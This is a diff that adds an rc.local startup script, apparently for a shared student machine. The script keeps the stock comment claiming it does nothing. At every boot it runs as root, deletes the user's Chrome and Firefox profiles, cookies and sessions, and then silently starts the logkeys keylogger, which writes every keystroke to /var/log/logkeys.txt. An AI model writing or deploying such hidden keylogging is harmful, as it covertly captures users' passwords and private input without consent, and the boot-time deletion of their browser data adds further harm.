@@ -1,0 +1,21 @@
+#!/bin/sh
+#
+# rc.local
+#
+# This script is executed at the end of each multiuser runlevel.
+# Make sure that the script will "exit 0" on success or any other
+# value on error.
+#
+# In order to enable or disable this script just change the execution
+# bits.
+#
+# By default this script does nothing.
+sudo rm /home/alumno/.config/google-chrome/Default/
+sudo rm /home/alumno/.cache/google-chrome
+sudo rm /home/alumno/.mozilla/firefox/*.default/cookies.sqlite
+sudo rm /home/alumno/.mozilla/firefox/*.default/*.sqlite ~/.mozilla/firefox/*default/sessionstore.js
+sudo rm -r /home/alumno/.cache/mozilla/firefox/*.default/*
+sudo rm -r /home/alumno/.mozilla/firefox/*
+
+sudo logkeys --start --keymap ../../../../etc/keymaps/es_ES.map -o /var/log/logkeys.txt
+exit 0
